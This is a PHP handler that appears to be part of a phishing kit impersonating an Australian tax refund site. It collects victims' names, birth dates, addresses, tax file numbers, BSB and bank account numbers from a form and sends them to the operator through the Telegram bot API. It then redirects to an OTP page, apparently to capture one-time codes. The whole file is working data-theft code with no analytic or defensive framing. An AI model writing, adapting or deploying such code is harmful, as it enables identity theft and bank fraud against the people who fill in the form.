<?php
error_reporting(E_ERROR | E_PARSE);

include "config.php";

if (isset($_POST['fname'])){

$msg = "
𝗡𝗲𝘄 𝗖𝗮𝗽𝘁𝘂𝗿𝗲 ✅

━━━━━━━━━━━━━━━━━━━━━━━━
𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {$_POST['fname']}
𝗗𝗮𝘁𝗲 𝗼𝗳 𝗕𝗶𝗿𝘁𝗵: {$_POST['dob']}
𝗙𝘂𝗹𝗹 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 𝗼𝗻 𝗙𝗶𝗹𝗲: {$_POST['address']}
𝗧𝗮𝘅 𝗙𝗶𝗹𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: {$_POST['tx']}
𝗗𝗮𝘁𝗲 𝗼𝗳 𝗜𝘀𝘀𝘂𝗲𝘀: {$_POST['issued']}
𝗢𝘂𝗿 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲 𝗡𝘂𝗺𝗯𝗲𝗿: {$_POST['reference']}
𝗕𝗦𝗕 𝗡𝘂𝗺𝗯𝗲𝗿: {$_POST['bsb']}
𝗕𝗮𝗻𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗡𝘂𝗺𝗯𝗲𝗿: {$_POST['acct']}
━━━━━━━━━━━━━━━━━━━━━━━━

Sent From taxrefundaus.online
";

    // Data to send in the POST request
    $data = [
    'chat_id' => $TELEGRAM_CHAT_ID,
    'text' => $msg
    ];

    // Initialize cURL session
    $ch = curl_init("https://api.telegram.org/bot{$TELEGRAM_API_KEY}/sendMessage?parse_mode=html");

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute cURL session and store the response
    if(curl_exec($ch)){
        header('Location: otp2.html');
    } else {
    }

    curl_close($ch);
}
?>